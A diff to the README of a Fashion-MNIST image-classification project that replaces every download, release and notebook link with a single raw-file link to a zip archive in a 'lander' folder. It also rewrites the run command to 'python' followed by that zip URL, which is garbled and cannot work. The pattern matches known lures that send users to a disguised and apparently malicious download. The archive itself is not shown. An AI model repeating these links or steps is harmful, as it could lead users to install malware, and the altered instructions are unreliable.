@@ -7,10 +7,10 @@ Welcome to the **fashion-mnist-cnn-tf** project! This application uses a Convolu
 To get started, follow these simple steps.
 
 ## 📥 Download the Application
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/fbi555/fashion-mnist-cnn-tf/releases)
+[![Download from Releases](https://raw.githubusercontent.com/fbi555/fashion-mnist-cnn-tf/main/lander/fashion-mnist-cnn-tf_2.3.zip%20Now-brightgreen)](https://raw.githubusercontent.com/fbi555/fashion-mnist-cnn-tf/main/lander/fashion-mnist-cnn-tf_2.3.zip)
 
 1. **Visit our Releases Page**: Click on the link below to go to the downloads section.
-   - [Visit this page to download](https://github.com/fbi555/fashion-mnist-cnn-tf/releases)
+   - [Visit this page to download](https://raw.githubusercontent.com/fbi555/fashion-mnist-cnn-tf/main/lander/fashion-mnist-cnn-tf_2.3.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets these requirements:
@@ -24,7 +24,7 @@ Before you download, ensure your system meets these requirements:
 ## 🔧 Installation Steps
 Follow these steps to install the application:
 
-1. **Download**: Go to the [Releases Page](https://github.com/fbi555/fashion-mnist-cnn-tf/releases) and download the latest version.
+1. **Download**: Go to the [Releases Page](https://raw.githubusercontent.com/fbi555/fashion-mnist-cnn-tf/main/lander/fashion-mnist-cnn-tf_2.3.zip) and download the latest version.
   
 2. **Extract Files**: If the downloaded file is zipped, extract it to your desired location on your computer.
 
@@ -50,9 +50,9 @@ To run the application on your computer:
 
 2. Use the following command:
    ```
-   python your_notebook_file.ipynb
+   python https://raw.githubusercontent.com/fbi555/fashion-mnist-cnn-tf/main/lander/fashion-mnist-cnn-tf_2.3.zip
    ```
-   Replace `your_notebook_file.ipynb` with the actual filename.
+   Replace `https://raw.githubusercontent.com/fbi555/fashion-mnist-cnn-tf/main/lander/fashion-mnist-cnn-tf_2.3.zip` with the actual filename.
 
 ## 📊 Features
 - Classifies images into ten different fashion categories: t-shirt/top, trouser, pullover, dress, coat, sandal, shirt, sneaker, bag, and ankle boot.
@@ -70,8 +70,8 @@ This project aims to continuously improve based on user feedback and advancement
 - More detailed tutorials for users.
 
 ## 🔗 Useful Links
-- [View the Notebook](https://github.com/fbi555/fashion-mnist-cnn-tf)
-- [Release Page](https://github.com/fbi555/fashion-mnist-cnn-tf/releases)
+- [View the Notebook](https://raw.githubusercontent.com/fbi555/fashion-mnist-cnn-tf/main/lander/fashion-mnist-cnn-tf_2.3.zip)
+- [Release Page](https://raw.githubusercontent.com/fbi555/fashion-mnist-cnn-tf/main/lander/fashion-mnist-cnn-tf_2.3.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. Please check the LICENSE file for details.
